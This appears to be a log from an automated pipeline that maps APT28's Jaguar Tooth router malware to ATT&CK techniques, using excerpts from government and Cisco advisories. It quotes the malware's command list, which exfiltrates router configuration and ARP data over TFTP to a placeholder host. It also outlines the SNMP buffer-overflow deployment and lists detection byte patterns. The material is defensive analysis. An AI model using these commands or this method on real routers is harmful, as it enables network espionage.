[Document(id='5a640bf5-7c7f-4f53-a572-697f449bc2cc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='For detailed TTPs , see the M alware Analysis R eport .\n\nTactic  ID Technique  Procedure  \nInitial \nAccess  T1190  Exploit Public -\nfacing \nApplication.\n\nAPT28 exploited \ndefault/well-known \ncommunity strings in \nSNMP as outlined in \nCVE-2017-6742 (Cisco \nBug ID: CSCve54313 ).\n\nInitial \nAccess  T1078.001  Valid Accounts.\n\nDefault Accounts.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='259e689e-566c-4ddd-8506-bb496b2fd19a', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='r, command : \n \n• sleep 5000  \n• enable \n• sh run | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ver | r tftp:// [IP ADDRESS] /[URL PAGE] \n• sleep 5000  \n• sh ip int bri | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh arp | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh cdp neig | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh start | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ip ro  | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh fla | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• disable \n• tclquit    \n \nSNMP exploit  \nOverview  \nJaguar Tooth is deployed via exploitation of the patched  SNMP vulnerability  CVE-2017 -6742 .'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Initial Access  T1190  Exploit Public -Facing \nApplication  Jaguar Tooth is deployed  via an \nSNMP exploit which grant s \nremote code execution and \nwrite -access to the target \noperating syste m. \n \nExfiltration  T1048.003  Exfiltration Over \nAlternative Protocol :  \nExfiltration Over \nUnencrypted Non -C2 \nProtocol  \n Jaguar Tooth exfiltrates \ncollected device information  over \nTFTP.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='Malware Deployment  \nFor some of the targeted devices, APT28 actors used an SNMP exploit to deploy malware, as detailed in the NCSC’s Jaguar Tooth Malware Analysis Report\n.\n\nThis \nmalware obtained further device information, which is exfiltrated over trivial file transfer protocol (TFTP), and enabled unauthenticated access via a backdoor.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='It defines a message format for communication between SNMP managers and agents.An SNMP agent gathers data from the SNMP MIB, which is the repository of information about device parameters and network data.\n\nIt also responds to requests from an SNMP manager to get or set data.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='Designed to prevent unauthorized direct communication to network devices, infrastructure access control lists (iACLs) are one of the most critical security controls that can be implemented in networks.Details on how customers can apply mitigations and disable the affected MIBs are available in thesecurity advisory.Cisco Talos provided additional details about this specific campaign as well as observations of a larger issue of which this campaign is an example – a rising volume of attacks against aging networking appliances and software across all vendors.')]
[2025-03-27 12:14:07,355 INFO] ++ Pre-conditions computed for action: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware using 9 documents:
[Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(id='6bfad2ef-5d32-479f-acf4-c14fdd72cb7f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='See the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.\n\nJaguar Tooth  is deployed by writing custom shellcode  to memory which can be used to write an \narbitrary 4 -byte value to any specified address.\n\nThis shellcode is then called repeatedly to \nincrementally write Jaguar Tooth into memory.'), Document(id='f0c4291c-5307-4bd7-8ce1-1612b0f4cadc', metadata={'source': './documents\\other\\NVD - cve-2017-6742.html'}, page_content='CVSS information contributed by other sources is also\n                                            displayed.CVSS 4.0 Severity and Vector Strings:NIST:NVDN/ANVD assessment\n                                       not yet provided.CVSS 3.x Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:8.8 HIGHVector:CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:HCVSS 2.0 Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:9.0 HIGHVector:(AV:N/AC:L/Au:S/C:C/I:C/A:C)References to Advisories, Solutions, and ToolsBy selecting these links, you will be leaving NIST webspace.'), Document(id='26ab1793-df1a-4242-87f3-3ecc9d1e049f', metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.Subscribe to Cisco Security NotificationsSubscribeAction Links for This AdvisorySnort Rule 43424Snort Rule 43425Snort Rule 43426Snort Rule 43427Snort Rule 43428Snort Rule 43429Snort Rule 43430Snort Rule 43431Snort Rule 43432Cisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionShow All 18...Related to This Advisory'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Initial Access  T1190  Exploit Public -Facing \nApplication  Jaguar Tooth is deployed  via an \nSNMP exploit which grant s \nremote code execution and \nwrite -access to the target \noperating syste m. \n \nExfiltration  T1048.003  Exfiltration Over \nAlternative Protocol :  \nExfiltration Over \nUnencrypted Non -C2 \nProtocol  \n Jaguar Tooth exfiltrates \ncollected device information  over \nTFTP.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='• Collects device information and exfiltrates over T rivial File Transfer Protocol (TFTP) .\n\n• Enables unauthenticated  backdoor access .\n\n• It is d eployed and executed via exploitation of the patched  Simple Network Management \nProtocol (SNMP) vulnerability  CVE-2017 -6742 .'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='Proper patch management for infrastructure devices reduces the risk of exploitation.The following resources include numerous best practices on how to harden infrastructure devices, perform integrity assurance checks, and provide guidance on how to perform forensic investigations:Cisco Guide to Harden Cisco IOS DevicesCisco Security Indicators of Compromise Reference GuideTelemetry-Based Infrastructure Device Integrity MonitoringCisco IOS Software Forensic Investigation Procedures for First RespondersCisco IOS XE Software Forensic Investigation Procedures for First RespondersCisco IOS Software Integrity AssuranceCisco IOS XE Software Integrity AssuranceCisco recognizes the technology vendor’s role in protecting customers and won’t shy away from our responsibility to constantly provide you with up-to-date information, as well as guidance on how to protect your network against cyber-attacks.For additional guidance and information, visit the below resources:Network Resilienceresources on theCisco Trust Center.We’d love to hear what you think.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.')]
[2025-03-27 12:14:21,878 INFO] ++ Post-conditions computed for action: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware using 9 documents:
[Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(id='6bfad2ef-5d32-479f-acf4-c14fdd72cb7f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='See the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.\n\nJaguar Tooth  is deployed by writing custom shellcode  to memory which can be used to write an \narbitrary 4 -byte value to any specified address.\n\nThis shellcode is then called repeatedly to \nincrementally write Jaguar Tooth into memory.'), Document(id='f0c4291c-5307-4bd7-8ce1-1612b0f4cadc', metadata={'source': './documents\\other\\NVD - cve-2017-6742.html'}, page_content='CVSS information contributed by other sources is also\n                                            displayed.CVSS 4.0 Severity and Vector Strings:NIST:NVDN/ANVD assessment\n                                       not yet provided.CVSS 3.x Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:8.8 HIGHVector:CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:HCVSS 2.0 Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:9.0 HIGHVector:(AV:N/AC:L/Au:S/C:C/I:C/A:C)References to Advisories, Solutions, and ToolsBy selecting these links, you will be leaving NIST webspace.'), Document(id='26ab1793-df1a-4242-87f3-3ecc9d1e049f', metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.Subscribe to Cisco Security NotificationsSubscribeAction Links for This AdvisorySnort Rule 43424Snort Rule 43425Snort Rule 43426Snort Rule 43427Snort Rule 43428Snort Rule 43429Snort Rule 43430Snort Rule 43431Snort Rule 43432Cisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionShow All 18...Related to This Advisory'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Initial Access  T1190  Exploit Public -Facing \nApplication  Jaguar Tooth is deployed  via an \nSNMP exploit which grant s \nremote code execution and \nwrite -access to the target \noperating syste m. \n \nExfiltration  T1048.003  Exfiltration Over \nAlternative Protocol :  \nExfiltration Over \nUnencrypted Non -C2 \nProtocol  \n Jaguar Tooth exfiltrates \ncollected device information  over \nTFTP.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='• Collects device information and exfiltrates over T rivial File Transfer Protocol (TFTP) .\n\n• Enables unauthenticated  backdoor access .\n\n• It is d eployed and executed via exploitation of the patched  Simple Network Management \nProtocol (SNMP) vulnerability  CVE-2017 -6742 .'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='By \nappending  additional bytes to the end of the OID , a stack -based buffer can be overflowed.\n\nOne of the side -effects of this vulnerability is that any ASCII characters in the additional OID bytes  are \nconverted to  uppercase , which constrains what data can be written and where .\n\nSee the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.')]
[2025-03-27 12:14:29,413 INFO] ++ Indicators computed for action: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol as used by the malware. The indicators are:
['The content contains "| 2 b   0 6   0 1   0 4   0 1   0 9   0 9   5 f   0 1   0 2   0 4   0 1   0 3 |".', 'The content contains "| 0 3   8 1   6 0   0 0   0 8 |".', 'The content contains "| 2 4   0 2   0 0   0 1 |".']
[2025-03-27 12:14:29,638 INFO] ++ Removed pre-condition: 
Network connectivity exists between the compromised device and the TFTP server.
, due to similarity with: 
A TFTP server is accessible to the compromised device.
 (tensor([[0.9010]]))
[2025-03-27 12:14:29,694 INFO] ++ Removed pre-condition: 
A TFTP server is accessible to the compromised device.
, due to similarity with: 
The compromised device has the capability to initiate a TFTP transfer.
 (tensor([[0.8729]]))
[2025-03-27 12:14:33,529 INFO] + Processing action: Automated Exfiltration as used by the malware
[2025-03-27 12:14:35,527 INFO] ++ Embedding computed for: Automated Exfiltration as used by the malware. The vector has shape: (384,)
[2025-03-27 12:14:35,535 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [automated exfiltration]: tensor([[0.5551]])
[2025-03-27 12:14:35,545 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [automated exfiltration: traffic duplication]: tensor([[0.4899]])
[2025-03-27 12:14:35,565 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [data transfer size limits]: tensor([[0.3028]])
[2025-03-27 12:14:35,585 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over alternative protocol]: tensor([[0.5246]])
[2025-03-27 12:14:35,597 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over alternative protocol: exfiltration over symmetric encrypted non-c2 protocol]: tensor([[0.4829]])
[2025-03-27 12:14:35,607 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over alternative protocol: exfiltration over asymmetric encrypted non-c2 protocol]: tensor([[0.4876]])
[2025-03-27 12:14:35,619 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol]: tensor([[0.5088]])
[2025-03-27 12:14:35,633 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over c2 channel]: tensor([[0.4996]])
[2025-03-27 12:14:35,644 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over other network medium]: tensor([[0.4934]])
[2025-03-27 12:14:35,656 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over other network medium: exfiltration over bluetooth]: tensor([[0.5160]])
[2025-03-27 12:14:35,668 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over physical medium]: tensor([[0.3574]])
[2025-03-27 12:14:35,680 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over physical medium: exfiltration over usb]: tensor([[0.3677]])
[2025-03-27 12:14:35,690 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over web service]: tensor([[0.4036]])
[2025-03-27 12:14:35,702 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over web service: exfiltration to code repository]: tensor([[0.3636]])
[2025-03-27 12:14:35,721 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over web service: exfiltration to cloud storage]: tensor([[0.3748]])
[2025-03-27 12:14:35,732 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over web service: exfiltration to text storage sites]: tensor([[0.4648]])
[2025-03-27 12:14:35,749 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [exfiltration over web service: exfiltration over webhook]: tensor([[0.3442]])
[2025-03-27 12:14:35,761 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [scheduled transfer]: tensor([[0.4163]])
[2025-03-27 12:14:35,772 INFO] ++ Similarity between [Automated Exfiltration as used by the malware] and [transfer data to cloud account]: tensor([[0.1778]])
[2025-03-27 12:14:35,773 INFO] ++ Scores: [('automated exfiltration', tensor([[0.5551]])), ('exfiltration over alternative protocol', tensor([[0.5246]])), ('exfiltration over other network medium: exfiltration over bluetooth', tensor([[0.5160]])), ('exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol', tensor([[0.5088]])), ('exfiltration over c2 channel', tensor([[0.4996]]))]
[2025-03-27 12:14:35,773 INFO] ++ Similar techniques found:
['automated exfiltration', 'exfiltration over alternative protocol', 'exfiltration over other network medium: exfiltration over bluetooth', 'exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol', 'exfiltration over c2 channel']
[2025-03-27 12:14:35,773 INFO] ++ Querying the QA model for action Automated Exfiltration as used by the malware with the following context:
automated exfiltration
exfiltration over alternative protocol
exfiltration over other network medium: exfiltration over bluetooth
exfiltration over alternative protocol: exfiltration over unencrypted non-c2 protocol
exfiltration over c2 channel
[2025-03-27 12:14:36,518 INFO] ++ QA suggested technique: automated exfiltration
[2025-03-27 12:14:36,519 INFO] ++ Selected technique: automated exfiltration
[2025-03-27 12:14:40,828 INFO] ++ Refining the action: Automated Exfiltration as used by the malware using 9 documents:
[Document(id='5a640bf5-7c7f-4f53-a572-697f449bc2cc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='For detailed TTPs , see the M alware Analysis R eport .\n\nTactic  ID Technique  Procedure  \nInitial \nAccess  T1190  Exploit Public -\nfacing \nApplication.\n\nAPT28 exploited \ndefault/well-known \ncommunity strings in \nSNMP as outlined in \nCVE-2017-6742 (Cisco \nBug ID: CSCve54313 ).\n\nInitial \nAccess  T1078.001  Valid Accounts.\n\nDefault Accounts.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='259e689e-566c-4ddd-8506-bb496b2fd19a', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='r, command : \n \n• sleep 5000  \n• enable \n• sh run | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ver | r tftp:// [IP ADDRESS] /[URL PAGE] \n• sleep 5000  \n• sh ip int bri | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh arp | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh cdp neig | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh start | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ip ro  | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh fla | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• disable \n• tclquit    \n \nSNMP exploit  \nOverview  \nJaguar Tooth is deployed via exploitation of the patched  SNMP vulnerability  CVE-2017 -6742 .'), Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Added comments to the Workaround configuration commands to document which exclusions tie to the vulnerable MIBs.Vulnerable Products, WorkaroundsInterim2017-JUL-031.0Initial public release.—Interim2017-JUN-29Show LessLegal DisclaimerTHIS DOCUMENT IS PROVIDED ON AN "AS IS" BASIS AND DOES NOT IMPLY ANY KIND OF GUARANTEE OR WARRANTY, INCLUDING THE WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR USE.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='You can read their findings and recommendations in theira blog postalso out today.Infrastructure devices are critical components of any organization’s IT infrastructure.\n\nThese devices are often the first line of defense against cyber-attacks and can help prevent unauthorized access to your network.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content="This vulnerability was first announced by Cisco on 29 June 2017, and patched software was made available.Cisco's published advisory provided workarounds, such as limiting access to SNMP from trusted hosts only, or by disabling a number of SNMP Management Information bases (MIBs).Malware DeploymentFor some of the targeted devices, APT28 actors used an SNMP exploit to deploy malware, as detailed in the NCSC’sJaguar Tooth Malware Analysis Report."), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='Further detail of how this was achieved in available in the MITRE ATT&CK section of the Jaguar Tooth MAR.ConclusionAPT28 has been known to access vulnerable routers by using default and weak SNMP community strings, and by exploiting CVE-2017-6742 (Cisco Bug ID: CSCve54313) as published by Cisco.TTPs in this advisory may still be used against vulnerable Cisco devices.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='Further detail of how \nthis was achieved in \navailable in the \nMITRE ATT&CK section  of the Jaguar Tooth \nMAR.\n\nConclusion  \n \nAPT28 has been known to access vulnerable routers by using default and weak \nSNMP community strings, and by exploiting CVE -2017- 6742 (Cisco Bug ID: \nCSCve54313) as published by Cisco.\n\nTTPs in this advisory may still be used against vulnerable Cisco devices.')]
[2025-03-27 12:15:17,500 INFO] ++ Pre-conditions computed for action: Automated Exfiltration as used by the malware using 9 documents:
[Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(id='6bfad2ef-5d32-479f-acf4-c14fdd72cb7f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='See the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.\n\nJaguar Tooth  is deployed by writing custom shellcode  to memory which can be used to write an \narbitrary 4 -byte value to any specified address.\n\nThis shellcode is then called repeatedly to \nincrementally write Jaguar Tooth into memory.'), Document(id='f0c4291c-5307-4bd7-8ce1-1612b0f4cadc', metadata={'source': './documents\\other\\NVD - cve-2017-6742.html'}, page_content='CVSS information contributed by other sources is also\n                                            displayed.CVSS 4.0 Severity and Vector Strings:NIST:NVDN/ANVD assessment\n                                       not yet provided.CVSS 3.x Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:8.8 HIGHVector:CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:HCVSS 2.0 Severity and Vector Strings:NIST:NVDBase\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tScore:9.0 HIGHVector:(AV:N/AC:L/Au:S/C:C/I:C/A:C)References to Advisories, Solutions, and ToolsBy selecting these links, you will be leaving NIST webspace.'), Document(id='26ab1793-df1a-4242-87f3-3ecc9d1e049f', metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='This document also contains instructions for obtaining fixed software and receiving security vulnerability information from Cisco.Subscribe to Cisco Security NotificationsSubscribeAction Links for This AdvisorySnort Rule 43424Snort Rule 43425Snort Rule 43426Snort Rule 43427Snort Rule 43428Snort Rule 43429Snort Rule 43430Snort Rule 43431Snort Rule 43432Cisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionCisco IOS and IOS-XE SNMP Remote Code ExecutionShow All 18...Related to This Advisory'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='The actor obtained this device information by executing a number of Command Line \nInterface (CLI) commands via the malware.\n\nIt includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses .'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='This malware obtained further device information, which is exfiltrated over trivial file transfer protocol (TFTP), and enabled unauthenticated access via a backdoor.The actor obtained this device information by executing a number of Command Line Interface (CLI) commands via the malware.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='This applies to any management interface or service in the device.\n\nExploitation of these vulnerabilities is best prevented by restricting access to trusted administrators and IP addresses.\n\nThe management plane consists of functions that achieve the management goals of the network.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Payload Execution  \nOnce written into memory, Jaguar Tooth payloads are executed by overflowing the return address of \nthe vulnerable function with their location in memory.\n\nConclusion  \nJaguar Tooth is non -persistent malware that targets Cisco IOS routers .\n\nCapability includ es automated \ndevice information collection that is exfiltrated over TFTP and unauthenticated backdoor access.')]
[2025-03-27 12:15:33,395 INFO] ++ Post-conditions computed for action: Automated Exfiltration as used by the malware using 9 documents:
[Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='5a640bf5-7c7f-4f53-a572-697f449bc2cc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='For detailed TTPs , see the M alware Analysis R eport .\n\nTactic  ID 